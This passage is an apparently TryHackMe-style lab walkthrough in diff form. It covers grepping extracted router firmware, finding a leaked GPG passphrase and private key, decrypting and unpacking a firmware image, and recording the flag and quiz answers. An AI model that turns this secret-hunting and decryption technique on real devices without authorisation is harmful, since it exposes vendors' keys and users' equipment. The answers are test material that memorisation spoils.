@@ -3428,3 +3428,1718 @@ fmk/rootfs/web/userRpm/WlanSecurityRpm.htm:setKey();
 fmk/rootfs/web/userRpm/DiagnosticRpm.htm:      <TD><INPUT name="pingAddr" id="pingAddr" type="text" class="text" value="" size="20" max
 length="50" onKeyDown="if(event.keyCode==13) return doOnEnter();">
 fmk/rootfs/web/userRpm/LoginRpm.htm:if (event.keyCode == 13)
+fmk/rootfs/web/userRpm/LoginRpm.htm:<body onkeypress="PCWin(event)" onload="pageLoad()">
+fmk/rootfs/web/userRpm/PPPoEv6CfgRpm.htm:if (obj.keyCode == 13)
+fmk/rootfs/web/userRpm/PPPoEv6CfgRpm.htm:        <form action="PPPoEv6CfgRpm.htm" enctype="multipart/form-data" method="get" onSubmit="
+return doSubmit();" onkeyDown="bindNext(event);">
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:"id=\"t_tur\">Turkey<", 0x290C, 0x290C, 0x290C, 0x290C, 0x390C, 0x390C, 0x390C, 0x390C, 0x390
+C, 0x310C, 0x310C,    0x310C, 0x310C, 0x0,    0x0,    0x0,    0x0,    0x0,    0x82,   0x0,    0x82,   0x0,    0x82,   0x0,       0x82, 
+  0x0,    0x8082, 0x8082, 0x8082, 0x8082, 0x0,    0x0,    0x0,    0x0,    0x0,    0x0,    0x0,       0x0,    0x0,    0x0,    0x0,    0x
+0,    0x0,    0x0,    0x0,    0x0,    0x0,    0x0,    0x0,    0x0,       0x0,    0x0,
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:function checkwephexkey(szkey)
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:for (var i = 0; i < szkey.length; i++)
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:c = szkey.charAt(i);
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:function checkwepasiikey(szkey)
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:for (var i = 0; i < szkey.length; i++)
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:c = szkey.charAt(i);
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:if (cf.keytype.value == 1)
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:cf.keytext.disabled = true;
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:if ((cf.keytype.value == 2) || (cf.keytype.value == 3))
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:cf.keytext.disabled = false;
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:cf.keytext.maxLength = (cf.keytype.value == 2)? 16:32;
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:else if(cf.keytype.value == 4)
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:cf.keytext.disabled = false;
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:cf.keytext.maxLength = 64;
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:function doSelKeytype()
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:if ((cf.keytype.value == 2) || (cf.keytype.value == 3))
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:cf.keytext.disabled = false;
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:cf.keytext.maxLength = (cf.keytype.value == 2)? 16:32;
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:else if(cf.keytype.value == 4)
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:cf.keytext.disabled = false;
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:cf.keytext.maxLength = 64;
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:cf.keytext.disabled = true;
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:document.getElementById("keytype_selected").style.display ="none";
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:document.getElementById("keytype_unselected").style.display ="none";
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:len = getValLen(cf.keytext.value);
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:c = cf.keytext.value.charAt(i);
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:c = cf.keytext.value.charAt(i);
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:var STALen = getValLen(cf.keytext.value);
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:if (wlanPara[46].charAt(i) != cf.keytext.value.charAt(i))
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:if ((cf.keytype.value < 1) || (cf.keytype.value > 4))
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:alert(js_key_corret="Please select key type.");
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:if ((cf.keytype.value == 2)&&((getValLen(cf.keytext.value)!=5) && (getValLen(cf
+.keytext.value)!=13) && (getValLen(cf.keytext.value)!=16)))
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:alert(js_key_corret1="The ASCII key'length must be 5,13 or 16!");
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:else if ((cf.keytype.value == 3)&&((getValLen(cf.keytext.value)!=10) && (getVal
+Len(cf.keytext.value)!=26) && (getValLen(cf.keytext.value)!=32)))
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:alert(js_key_corret2="The HEX key'length must be 10,26 or 32!");
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:if (cf.keytype.value == 2)
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:if (checkwepasiikey(cf.keytext.value) == false)
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:alert(js_wepkey_corret="The asii wep key includes illegal chara
+cters!");
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:else if (cf.keytype.value == 3)
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:if (checkwephexkey(cf.keytext.value) == false)
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:alert(js_wepkey_corret1="The hex wep key includes illegal chara
+cters!");
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:else if (cf.keytype.value == 4)
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:if ((getValLen(cf.keytext.value) == 64) && (checkwephexkey(cf.keytext.v
+alue) == false))
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:alert(js_pskkey_corret="The 64 bytes PSK password include non-h
+exadecimal characters, please input again.");
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:cf.keytype.value = 1;
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:cf.keytext.value = "";
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:if ((wlanPara[33] > 1) && (cf.keytype.value == 4))
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:if (((cf.keytype.value == 2) && (wlanPara[45] == 2))//asii
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:|| ((cf.keytype.value == 3) && (wlanPara[45] == 1)))/
+/hex
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:if (cf.keytype.value == 4)
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:doSelKeytype();
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:<TR id="keytype_selected" style="display:none">
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:<TD style="color:red" id="t_keytype_selected" name="t_keytype_selected"
+>Key type is selected.</TD>
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:<TR id="keytype_unselected" style="display:none">
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:<TD style="color:red"><span id="t_keytype_unselected" name="t_keytype_u
+nselected">The key type of AP is WEP. Please selected WEP(ASCII) or WEP(HEX),</span> 
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:<br/><span id="t_keytype_unselected1" name="t_keytype_unselected1">mean
+while choose WEP index and auth type.</span></TD>
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:          <TD class="Item" id="t_keytype">Key type:</TD>
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:          <TD><SELECT name="keytype" style = "width:180px" onChange="doSelKeytype()">
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:          <TD class=Item style="padding-left:40px" id="t_keytext">Password:</TD>
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:          <TD colspan = "3"><INPUT name="keytext" type=text class=text id="keytext"></TD>
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:document.forms[0].keytype.value = wlanPara[25];
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:document.forms[0].keytext.value = wlanPara[26];
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:document.getElementById("keytype_unselected").style.display ="";
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:    document.getElementById("keytype_unselected").style.display ="none";
+fmk/rootfs/web/userRpm/WlanNetworkRpm.htm:document.getElementById("keytype_selected").style.display ="";
+fmk/rootfs/web/userRpm/WzdWlanRpm.htm:// check ssid1 when keyup event occurs
+fmk/rootfs/web/userRpm/WzdWlanRpm.htm:function checkkeyup()
+fmk/rootfs/web/userRpm/WzdWlanRpm.htm:// check ssid1 when keydown event occurs
+fmk/rootfs/web/userRpm/WzdWlanRpm.htm:function checkkeydown()
+fmk/rootfs/web/userRpm/WzdWlanRpm.htm:var c = window.event.keyCode;
+fmk/rootfs/web/userRpm/WzdWlanRpm.htm:"id=\"t_tur\">Turkey<", 0x290C, 0x290C, 0x290C, 0x290C, 0x390C, 0x390C, 0x390C, 0x390C, 0x390C, 0
+x310C, 0x310C,    0x310C, 0x310C, 0x0,    0x0,    0x0,    0x0,    0x0,    0x82,   0x0,    0x82,   0x0,    0x82,   0x0,       0x82,   0x
+0,    0x8082, 0x8082, 0x8082, 0x8082, 0x0,    0x0,    0x0,    0x0,    0x0,    0x0,    0x0,       0x0,    0x0,    0x0,    0x0,    0x0,  
+  0x0,    0x0,    0x0,    0x0,    0x0,    0x0,    0x0,    0x0,       0x0,    0x0,
+fmk/rootfs/web/userRpm/WzdL2TPRpm.htm:if (obj.keyCode == 13)
+fmk/rootfs/web/userRpm/WzdL2TPRpm.htm:<BODY onLoad="changeIpType();setTagStr(document,'ntw_wzd_l2tp');LoadHelp('WzdL2TPHelpRpm.htm'); r
+esize(this);" onResize="resize(this);" onkeyDown="bindNext(event);">
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:var keyLen64 = 10;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:var keyLen128 = 26;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:var keyLen152 = 32;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:function getKeyLen(type)
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:    var keyLen = 0;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:    keyLen = keyLen64;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:    keyLen = keyLen128;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:    keyLen = keyLen152;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:    return keyLen;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:    var keyLen = 0;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:    keyLen = getKeyLen(cf.Type.selectedIndex + 1);
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:    if (keyLen > 0)
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:        cf.key.disabled = false;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:        cf.key.maxLength = cf.key.size = keyLen;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:        cf.key.value = cf.key.value.substring(0, keyLen);
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:        cf.key.disabled = true;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:        cf.key.maxLength = cf.key.size = keyLen152;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:function checkKey(key, type)
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:    var expectedLen = getKeyLen(type);
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:    if (key.length != expectedLen)
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:    for (var i = 0; i < key.length; i++)
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:        c = key.charAt(i);
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:    if (!checkKey(document.forms[0].key.value, document.forms[0].Type.selectedIndex + 1)
+)
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:        var element = document.forms[0].key;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:        alert(js_pl_cor_wep="Please input a correct WEP Key!")
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:<td style="display:none" class=Item id = "t_wep_key"> WEP Key: 
+</TD>
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:<INPUT name="key" type="text" class="text" value="" siz
+e="32" maxlength="32">
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:document.forms[0].key.value =wlanFilterAdvPara[3];
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:document.forms[0].key.size=(getKeyLen(wlanFilterAdvPara[2]) == 0)?keyLen152:getKe
+yLen(wlanFilterAdvPara[2]);
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:document.forms[0].key.maxLength=(getKeyLen(wlanFilterAdvPara[2]) == 0)?keyLen152:getKeyL
+en(wlanFilterAdvPara[2]);
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:document.forms[0].key.disabled = (wlanFilterAdvPara[2] == 1 || wlanFilterAdvPara[2] ==2)
+?true:false;
+fmk/rootfs/web/userRpm/WlanMacFilterRpmAdv.htm:document.getElementById("t_wep_key").style.display=(wlanFilterAdvPara[9])?"block":"none"
+;
+fmk/rootfs/gpg/public.key:-----BEGIN PGP PUBLIC KEY BLOCK-----
+fmk/rootfs/gpg/public.key:-----END PGP PUBLIC KEY BLOCK-----
+fmk/rootfs/gpg/private.key:-----BEGIN PGP PRIVATE KEY BLOCK-----
+fmk/rootfs/gpg/private.key:-----END PGP PRIVATE KEY BLOCK-----
+
+test@ip-10-10-149-38:~/bin-unsigned$ grep -ir paraphrase
+fmk/rootfs/gpg/secret.txt:PARAPHRASE: Santa@2022
+
+test@ip-10-10-149-38:~/bin-unsigned$ gpg --import fmk/rootfs/gpg/private.key
+
+┌────────────────────────────────────────────────────────────────┐
+│ Please enter the passphrase to import the OpenPGP secret key:  │
+│ "McSkidy <mcskidy@santagift.shop>"│
+│ 3072-bit RSA key, ID 56013838A8C14EC1,│
+│ created .│
+││
+││
+│ Passphrase: **********________________________________________ │
+││
+│<OK><Cancel>│
+└────────────────────────────────────────────────────────────────┘
+
+gpg: key 56013838A8C14EC1: secret key imported
+gpg: Total number processed: 1
+gpg:               imported: 1
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+
+test@ip-10-10-149-38:~/bin-unsigned$ gpg --import fmk/rootfs/gpg/public.key 
+gpg: key 56013838A8C14EC1: "McSkidy <mcskidy@santagift.shop>" not changed
+gpg: Total number processed: 1
+gpg:              unchanged: 1
+
+test@ip-10-10-149-38:~/bin-unsigned$ gpg --list-secret-keys
+/home/test/.gnupg/pubring.kbx
+-----------------------------
+sec   rsa3072  [SC] [expires: ]
+      514B4994E9B3E47A4F89507A56013838A8C14EC1
+uid           [ unknown] McSkidy <mcskidy@santagift.shop>
+ssb   rsa3072  [E] [expires: ]
+
+test@ip-10-10-149-38:~/bin$ gpg firmwarev2.2-encrypted.gpg 
+
+┌────────────────────────────────────────────────────────────────┐
+│ Please enter the passphrase to unlock the OpenPGP secret key:  │
+│ "McSkidy <mcskidy@santagift.shop>"│
+│ 3072-bit RSA key, ID 1A2D5BB2F7076FA8,│
+│ created  (main key ID 56013838A8C14EC1).│
+││
+││
+│ Passphrase: **********________________________________________ │
+││
+│<OK><Cancel>│
+└────────────────────────────────────────────────────────────────┘
+
+gpg: encrypted with 3072-bit RSA key, ID 1A2D5BB2F7076FA8, created 
+      "McSkidy <mcskidy@santagift.shop>"
+
+test@ip-10-10-149-38:~/bin$ ls -lah
+total 7.4M
+drwxrwxr-x 2 test test 4.0K Dec 22 04:41 .
+drwxr-xr-x 8 test test 4.0K Nov 23 18:01 ..
+-rw-rw-r-- 1 test test 3.9M Dec 22 04:41 firmwarev2.2-encrypted
+-rw-rw-r-- 1 test test 3.6M Dec  1 05:45 firmwarev2.2-encrypted.gpg
+test@ip-10-10-149-38:~/bin$ extract-firmware.sh firmwarev2.2-encrypted
+Firmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake
+
+Scanning firmware...
+
+Scan Time:     
+Target File:   /home/test/bin/firmwarev2.2-encrypted
+MD5 Checksum:  714c30af5db1e156e35b374f87c59d6f
+Signatures:    344
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             TP-Link firmware header, firmware version: 0.-15360.3, image version: "", product ID: 0x0, product versio
+n: 138412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 4063744, kernel length: 512, rootfs offset: 8491
+04, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
+13344         0x3420          U-Boot version string, "U-Boot 1.1.4 (Apr  6 2016 - 11:12:23)"
+13392         0x3450          CRC32 polynomial table, big endian
+14704         0x3970          uImage header, header size: 64 bytes, header CRC: 0x5A946B00, created: , image size: 3
+5920 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x510235FE, OS: Linux, CPU: MIPS, image type: Firmware Image, 
+compression type: lzma, image name: "u-boot image"
+14768         0x39B0          LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 93944 bytes
+131584        0x20200         TP-Link firmware header, firmware version: 0.0.3, image version: "", product ID: 0x0, product version: 13
+8412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 3932160, kernel length: 512, rootfs offset: 849104, r
+ootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
+132096        0x20400         LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2494744 bytes
+1180160       0x120200        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2809007 bytes, 605 inodes, block
+size: 131072 bytes, created: 
+
+Extracting 1180160 bytes of tp-link header image at offset 0
+Extracting squashfs file system at offset 1180160
+3990016
+3990016
+0
+Extracting squashfs files...
+Firmware extraction successful!
+Firmware parts can be found in '/home/test/bin/fmk/*'
+
+test@ip-10-10-149-38:~/bin$ cd ..
+test@ip-10-10-149-38:~$ ls
+bin  bin-unsigned  firmware-mod-kit
+test@ip-10-10-149-38:~$ cd bin
+test@ip-10-10-149-38:~/bin$ ls
+firmwarev2.2-encrypted  firmwarev2.2-encrypted.gpg  fmk
+test@ip-10-10-149-38:~/bin$ cd fmk
+test@ip-10-10-149-38:~/bin/fmk$ ls
+image_parts  logs  rootfs
+test@ip-10-10-149-38:~/bin/fmk$ cd rootfs/
+test@ip-10-10-149-38:~/bin/fmk/rootfs$ ls
+Camera  bin  dev  etc  flag.txt  lib  linuxrc  mnt  proc  root  sbin  sys  tmp  usr  var  web
+test@ip-10-10-149-38:~/bin/fmk/rootfs$ cat flag.txt
+THM{WE_GOT_THE_FIRMWARE_CODE}
+```
+![[Pasted image 20221221233753.png]]
+What is the Paraphrase value for the binary firmwarev1.0_unsigned?
+*Santa@2022*
+After reversing the encrypted firmware, can you find the build number for rootfs?
+Use ls -lah * command.
+```text
+test@ip-10-10-149-38:~/bin/fmk/rootfs$ ls -lah *
+-rw-r--r--  1 root root   30 Dec  1 05:42 flag.txt
+lrwxrwxrwx  1 root root   11 Dec 22 04:42 linuxrc -> bin/busybox
+
+Camera:
+total 16K
+drwxrwxr-x  4 root root 4.0K Dec  1 05:37 .
+drwxr-xr-x 16 root root 4.0K Dec  1 05:42 ..
+drwxrwxr-x  2 root root 4.0K Dec  1 05:37 deploy
+drwxrwxr-x  2 root root 4.0K Dec  1 05:37 src
+
+bin:
+total 320K
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 .
+drwxr-xr-x 16 root root 4.0K Dec  1 05:42 ..
+-rwxr-xr-x  1 root root 308K Apr  6  2016 busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 cat -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 chmod -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 date -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 df -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 echo -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 false -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 hostname -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 ip -> busybox
+lrwxrwxrwx  1 root root   87 Dec 22 04:42 iptables-xml -> /workspace/jenkins/workspace/model_qca/build/../rootfs.build.2.6.31/sbin/ipta
+bles-multi
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 kill -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 ln -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 login -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 ls -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 mount -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 msh -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 ping -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 ps -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 rm -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 sh -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 sleep -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 true -> busybox
+lrwxrwxrwx  1 root root    7 Dec 22 04:42 umount -> busybox
+
+dev:
+total 12K
+drwxr-xr-x  3 root root    4.0K Apr  6  2016 .
+drwxr-xr-x 16 root root    4.0K Dec  1 05:42 ..
+crw-r--r--  1 root root 239,  0 Apr  6  2016 ar7100_flash_chrdev
+crw-r--r--  1 root root 238,  0 Apr  6  2016 ar7100_gpio_chrdev
+brw-r--r--  1 root root  31,  4 Apr  6  2016 caldata
+crw-r--r--  1 root root   5,  1 Apr  6  2016 console
+crw-r--r--  1 root root  63,  0 Apr  6  2016 dk0
+crw-r--r--  1 root root  63,  1 Apr  6  2016 dk1
+crw-r--r--  1 root root   1,  2 Apr  6  2016 kmem
+crw-r--r--  1 root root   1,  1 Apr  6  2016 mem
+crw-r--r--  1 root root  90,  0 Apr  6  2016 mtd0
+brw-r--r--  1 root root  31,  0 Apr  6  2016 mtdblock0
+brw-r--r--  1 root root  31,  1 Apr  6  2016 mtdblock1
+brw-r--r--  1 root root  31,  2 Apr  6  2016 mtdblock2
+brw-r--r--  1 root root  31,  3 Apr  6  2016 mtdblock3
+brw-r--r--  1 root root  31,  4 Apr  6  2016 mtdblock4
+brw-r--r--  1 root root  31,  5 Apr  6  2016 mtdblock5
+brw-r--r--  1 root root  31,  6 Apr  6  2016 mtdblock6
+crw-r--r--  1 root root  90,  1 Apr  6  2016 mtdr0
+crw-r--r--  1 root root   1,  3 Apr  6  2016 null
+crw-r--r--  1 root root 108,  0 Apr  6  2016 ppp
+crw-r--r--  1 root root   5,  2 Apr  6  2016 ptmx
+drwxr-xr-x  2 root root    4.0K Apr  6  2016 pts
+crw-r--r--  1 root root   2,  0 Apr  6  2016 ptyp0
+crw-r--r--  1 root root   2,  1 Apr  6  2016 ptyp1
+crw-r--r--  1 root root   2,  2 Apr  6  2016 ptyp2
+brw-r--r--  1 root root   1,  0 Apr  6  2016 ram0
+crw-r--r--  1 root root   1,  8 Apr  6  2016 random
+crw-r--r--  1 root root   5,  0 Apr  6  2016 tty
+crw-r--r--  1 root root   4,  0 Apr  6  2016 tty0
+crw-r--r--  1 root root   4,  1 Apr  6  2016 tty1
+crw-r--r--  1 root root   4,  2 Apr  6  2016 tty2
+crw-r--r--  1 root root 166,  0 Apr  6  2016 ttyACM0
+crw-r--r--  1 root root 166,  1 Apr  6  2016 ttyACM1
+crw-r--r--  1 root root 166, 10 Apr  6  2016 ttyACM10
+crw-r--r--  1 root root 166, 11 Apr  6  2016 ttyACM11
+crw-r--r--  1 root root 166, 12 Apr  6  2016 ttyACM12
+crw-r--r--  1 root root 166, 13 Apr  6  2016 ttyACM13
+crw-r--r--  1 root root 166, 14 Apr  6  2016 ttyACM14
+crw-r--r--  1 root root 166, 15 Apr  6  2016 ttyACM15
+crw-r--r--  1 root root 166,  2 Apr  6  2016 ttyACM2
+crw-r--r--  1 root root 166,  3 Apr  6  2016 ttyACM3
+crw-r--r--  1 root root 166,  4 Apr  6  2016 ttyACM4
+crw-r--r--  1 root root 166,  5 Apr  6  2016 ttyACM5
+crw-r--r--  1 root root 166,  6 Apr  6  2016 ttyACM6
+crw-r--r--  1 root root 166,  7 Apr  6  2016 ttyACM7
+crw-r--r--  1 root root 166,  8 Apr  6  2016 ttyACM8
+crw-r--r--  1 root root 166,  9 Apr  6  2016 ttyACM9
+crw-r--r--  1 root root   4, 64 Apr  6  2016 ttyS0
+crw-r--r--  1 root root   4, 65 Apr  6  2016 ttyS1
+crw-r--r--  1 root root   4, 66 Apr  6  2016 ttyS2
+crw-r--r--  1 root root 188,  0 Apr  6  2016 ttyUSB0
+crw-r--r--  1 root root 188,  1 Apr  6  2016 ttyUSB1
+crw-r--r--  1 root root 188, 10 Apr  6  2016 ttyUSB10
+crw-r--r--  1 root root 188, 11 Apr  6  2016 ttyUSB11
+crw-r--r--  1 root root 188, 12 Apr  6  2016 ttyUSB12
+crw-r--r--  1 root root 188, 13 Apr  6  2016 ttyUSB13
+crw-r--r--  1 root root 188, 14 Apr  6  2016 ttyUSB14
+crw-r--r--  1 root root 188, 15 Apr  6  2016 ttyUSB15
+crw-r--r--  1 root root 188,  2 Apr  6  2016 ttyUSB2
+crw-r--r--  1 root root 188,  3 Apr  6  2016 ttyUSB3
+crw-r--r--  1 root root 188,  4 Apr  6  2016 ttyUSB4
+crw-r--r--  1 root root 188,  5 Apr  6  2016 ttyUSB5
+crw-r--r--  1 root root 188,  6 Apr  6  2016 ttyUSB6
+crw-r--r--  1 root root 188,  7 Apr  6  2016 ttyUSB7
+crw-r--r--  1 root root 188,  8 Apr  6  2016 ttyUSB8
+crw-r--r--  1 root root 188,  9 Apr  6  2016 ttyUSB9
+crw-r--r--  1 root root   3,  0 Apr  6  2016 ttyp0
+crw-r--r--  1 root root   3,  1 Apr  6  2016 ttyp1
+crw-r--r--  1 root root   3,  2 Apr  6  2016 ttyp2
+crw-r--r--  1 root root   1,  9 Apr  6  2016 urandom
+crw-r--r--  1 root root   1,  5 Apr  6  2016 zero
+
+etc:
+total 92K
+drwxr-xr-x  7 root root 4.0K Apr  6  2016 .
+drwxr-xr-x 16 root root 4.0K Dec  1 05:42 ..
+drwxr-xr-x  3 root root 4.0K Apr  6  2016 ath
+-rw-r--r--  1 root root   25 Apr  6  2016 dhcp6cctlkey
+-rw-r--r--  1 root root   25 Apr  6  2016 dhcp6sctlkey
+-rwxr-xr-x  1 root root   67 Apr  6  2016 fstab
+-rwxr-xr-x  1 root root  243 Apr  6  2016 group
+-rwxr-xr-x  1 root root   26 Apr  6  2016 host.conf
+-rwxr-xr-x  1 root root   85 Apr  6  2016 inittab
+-rwxr-xr-x  1 root root   13 Apr  6  2016 issue
+-rwxr-xr-x  1 root root   54 Apr  6  2016 lld2d.conf
+-rwxr-xr-x  1 root root  215 Apr  6  2016 nsswitch.conf
+lrwxrwxrwx  1 root root   13 Dec 22 04:42 passwd -> ../tmp/passwd
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 ppp
